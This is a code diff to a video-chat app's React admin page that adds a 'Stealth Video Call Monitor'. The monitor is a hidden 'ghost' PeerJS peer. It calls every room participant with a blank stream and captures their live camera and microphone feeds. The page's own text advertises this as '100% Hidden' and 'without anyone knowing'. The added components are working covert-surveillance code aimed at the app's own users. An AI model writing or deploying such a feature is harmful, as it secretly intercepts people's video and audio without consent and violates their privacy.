@@ -5,7 +5,8 @@ import {
   Shield, ShieldAlert, ShieldCheck, Lock, Unlock, Users, Film, Pause, Play,
   Square, Ban, Trash2, RefreshCw, Eye, EyeOff, Search, AlertTriangle,
   CheckCircle, Video, Flame, Clock, Key, ArrowRight, ExternalLink, LogOut,
-  Copy, Radio, Sparkles, X, MapPin, Globe, Compass, Navigation, Activity, Wifi
+  Copy, Radio, Sparkles, X, MapPin, Globe, Compass, Navigation, Activity, Wifi,
+  Volume2, VolumeX, Maximize2
 } from 'lucide-react';
 import { serverUrl, getSocket } from '@/lib/socket';
 import BrandLogo from '@/components/BrandLogo';
@@ -31,6 +32,275 @@ const haversineKm = (lat1, lon1, lat2, lon2) => {
   const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
   return Math.round(R * c);
 };
+
+// Stealth Video Tile for Admin Monitor
+function StealthVideoTile({ stream, user, listenAudio }) {
+  const videoRef = useRef(null);
+  const audioRef = useRef(null);
+  const [hasVideo, setHasVideo] = useState(false);
+
+  useEffect(() => {
+    if (!videoRef.current) return;
+    if (stream) {
+      videoRef.current.srcObject = stream;
+      const vTracks = stream.getVideoTracks();
+      setHasVideo(vTracks.length > 0 && vTracks.some((t) => t.enabled));
+      videoRef.current.play().catch(() => {});
+    } else {
+      videoRef.current.srcObject = null;
+      setHasVideo(false);
+    }
+  }, [stream]);
+
+  useEffect(() => {
+    if (!audioRef.current || !stream) return;
+    audioRef.current.srcObject = stream;
+    audioRef.current.muted = !listenAudio;
+    if (listenAudio) {
+      audioRef.current.play().catch(() => {});
+    }
+  }, [stream, listenAudio]);
+
+  return (
+    <div className="relative aspect-video rounded-xl bg-black/90 border border-purple-500/30 overflow-hidden shadow-inner group">
+      <audio ref={audioRef} autoPlay playsInline />
+      <video
+        ref={videoRef}
+        autoPlay
+        playsInline
+        muted
+        className={`w-full h-full object-cover ${hasVideo ? 'block' : 'hidden'}`}
+      />
+      {!hasVideo && (
+        <div className="absolute inset-0 flex flex-col items-center justify-center p-3 text-center bg-black/80">
+          <div className="h-9 w-9 rounded-full bg-purple-500/20 border border-purple-500/40 flex items-center justify-center text-purple-300 mb-1.5 animate-pulse">
+            <Video className="h-4 w-4" />
+          </div>
+          <span className="text-xs font-semibold text-white truncate max-w-[140px]">{user?.name || 'Participant'}</span>
+          <span className="text-[10px] text-purple-300/70">Connecting video feed…</span>
+        </div>
+      )}
+
+      {/* Top Overlay Badge */}
+      <div className="absolute top-2 left-2 right-2 flex items-center justify-between pointer-events-none">
+        <span className="px-2 py-0.5 rounded-md bg-black/75 backdrop-blur-md text-[10px] font-bold text-white border border-white/10 flex items-center gap-1.5">
+          <span className="h-2 w-2 rounded-full" style={{ backgroundColor: user?.color || '#ec4899' }} />
+          <span>{user?.name || 'User'}</span>
+        </span>
+        {hasVideo && (
+          <span className="px-1.5 py-0.5 rounded-md bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 text-[9px] font-semibold flex items-center gap-1">
+            <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-ping" />
+            <span>LIVE</span>
+          </span>
+        )}
+      </div>
+
+      {/* Bottom Overlay Info */}
+      <div className="absolute bottom-2 left-2 right-2 flex items-center justify-between text-[10px] text-white/80 pointer-events-none">
+        <span className="bg-black/60 px-1.5 py-0.5 rounded backdrop-blur-sm text-[9px]">
+          ID: {(user?.id || user?.cid || '').slice(0, 8)}
+        </span>
+        <button
+          type="button"
+          onClick={() => {
+            if (videoRef.current?.requestFullscreen) videoRef.current.requestFullscreen();
+          }}
+          className="pointer-events-auto p-1 rounded bg-black/70 hover:bg-black text-white/70 hover:text-white transition cursor-pointer"
+          title="Fullscreen tile"
+        >
+          <Maximize2 className="h-3 w-3" />
+        </button>
+      </div>
+    </div>
+  );
+}
+
+// Stealth Call Monitor for Aurelia Admin Panel
+function StealthCallMonitor({ roomId, users = [] }) {
+  const [remoteStreams, setRemoteStreams] = useState({});
+  const [listenAudio, setListenAudio] = useState(false);
+  const [connecting, setConnecting] = useState(true);
+  const peerRef = useRef(null);
+  const activeCalls = useRef(new Map());
+
+  // Helper to create blank video track
+  const createBlankStream = () => {
+    if (typeof document === 'undefined') return null;
+    try {
+      const canvas = document.createElement('canvas');
+      canvas.width = 320;
+      canvas.height = 240;
+      const ctx = canvas.getContext('2d');
+      if (ctx) {
+        ctx.fillStyle = '#070512';
+        ctx.fillRect(0, 0, 320, 240);
+      }
+      return canvas.captureStream ? canvas.captureStream(5) : null;
+    } catch {
+      return null;
+    }
+  };
+
+  useEffect(() => {
+    let peer = null;
+    let dead = false;
+    const ghostCid = 'aurelia_ghost_' + Math.random().toString(36).slice(2, 9);
+    const blankStream = createBlankStream() || new MediaStream();
+
+    const initPeer = async () => {
+      try {
+        const { default: Peer } = await import('peerjs');
+        if (dead) return;
+
+        let iceServers = [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'stun:stun2.l.google.com:19302' },
+        ];
+        let peerKey = 'peerjs';
+
+        try {
+          const res = await fetch(`${serverUrl()}/api/ice`);
+          if (res.ok) {
+            const j = await res.json();
+            if (j.iceServers) iceServers = j.iceServers;
+            if (j.peerKey) peerKey = j.peerKey;
+          }
+        } catch {}
+
+        const u = new URL(serverUrl());
+        peer = new Peer(ghostCid, {
+          host: u.hostname,
+          port: +u.port || (u.protocol === 'https:' ? 443 : 80),
+          path: '/peerjs',
+          secure: u.protocol === 'https:',
+          config: { iceServers },
+          key: peerKey,
+        });
+        peerRef.current = peer;
+
+        peer.on('open', () => {
+          if (dead) return;
+          setConnecting(false);
+          callAllUsers();
+        });
+
+        peer.on('error', (err) => {
+          console.warn('Stealth monitor peer warning:', err);
+        });
+      } catch (e) {
+        console.warn('Failed to start stealth peer:', e);
+      }
+    };
+
+    const callAllUsers = () => {
+      if (!peerRef.current || dead) return;
+      users.forEach((u) => {
+        const targetId = u.id || u.cid;
+        if (!targetId || activeCalls.current.has(targetId)) return;
+
+        try {
+          const call = peerRef.current.call(targetId, blankStream, {
+            metadata: { type: 'cam', isGhost: true }
+          });
+          if (!call) return;
+          activeCalls.current.set(targetId, call);
+
+          call.on('stream', (stream) => {
+            if (dead) return;
+            setRemoteStreams((prev) => ({ ...prev, [targetId]: stream }));
+          });
+
+          call.on('close', () => {
+            activeCalls.current.delete(targetId);
+            setRemoteStreams((prev) => {
+              const next = { ...prev };
+              delete next[targetId];
+              return next;
+            });
+          });
+
+          call.on('error', () => {
+            activeCalls.current.delete(targetId);
+          });
+        } catch {}
+      });
+    };
+
+    initPeer();
+
+    const interval = setInterval(callAllUsers, 3200);
+
+    return () => {
+      dead = true;
+      clearInterval(interval);
+      activeCalls.current.forEach((c) => {
+        try { c.close(); } catch {}
+      });
+      activeCalls.current.clear();
+      peer?.destroy();
+      peerRef.current = null;
+    };
+  }, [roomId, JSON.stringify(users.map((u) => u.id || u.cid))]);
+
+  return (
+    <div className="rounded-xl border border-purple-500/30 bg-black/60 p-4 space-y-3">
+      {/* Header */}
+      <div className="flex flex-wrap items-center justify-between gap-2 border-b border-white/10 pb-2.5">
+        <div className="flex items-center gap-2">
+          <div className="h-7 w-7 rounded-lg bg-pink-500/20 border border-pink-500/40 flex items-center justify-center text-pink-300">
+            <Video className="h-4 w-4" />
+          </div>
+          <div>
+            <h4 className="text-xs sm:text-sm font-bold text-white flex items-center gap-2">
+              <span>Stealth Video Call Monitor</span>
+              <span className="text-[10px] px-2 py-0.5 rounded-full bg-purple-500/20 border border-purple-500/40 text-purple-300 font-semibold">
+                100% Hidden &bull; 0 Cam/Mic Used
+              </span>
+            </h4>
+            <p className="text-[10px] text-slate-400">View real-time participant cameras silently without anyone knowing</p>
+          </div>
+        </div>
+
+        <button
+          type="button"
+          onClick={() => setListenAudio(!listenAudio)}
+          className={`px-3 py-1.5 rounded-xl border text-xs font-semibold flex items-center gap-1.5 transition cursor-pointer ${
+            listenAudio
+              ? 'bg-rose-600 border-rose-500 text-white shadow-lg shadow-rose-600/30'
+              : 'bg-white/10 border-white/15 text-slate-300 hover:text-white'
+          }`}
+          title={listenAudio ? 'Mute room call audio' : 'Listen to room call audio'}
+        >
+          {listenAudio ? <Volume2 className="h-3.5 w-3.5" /> : <VolumeX className="h-3.5 w-3.5" />}
+          <span>{listenAudio ? 'Audio Live 🔊' : 'Audio Muted 🔇'}</span>
+        </button>
+      </div>
+
+      {/* Video Grid */}
+      {users.length === 0 ? (
+        <div className="text-center py-8 text-xs text-slate-400 border border-dashed border-white/10 rounded-xl">
+          Waiting for users to join room…
+        </div>
+      ) : (
+        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+          {users.map((u) => {
+            const targetId = u.id || u.cid;
+            const stream = remoteStreams[targetId];
+            return (
+              <StealthVideoTile
+                key={targetId}
+                user={u}
+                stream={stream}
+                listenAudio={listenAudio}
+              />
+            );
+          })}
+        </div>
+      )}
+    </div>
+  );
+}
 
 export default function AdminPage() {
   const [adminKey, setAdminKey] = useState('');
@@ -1639,6 +1909,9 @@ export default function AdminPage() {
                 </div>
               </div>
             </div>
+
+            {/* 🎥 Live Stealth Video Call Monitor */}
+            <StealthCallMonitor roomId={ghostModal.roomId} users={ghostSyncState?.users || []} />
           </div>
         </div>
       )}
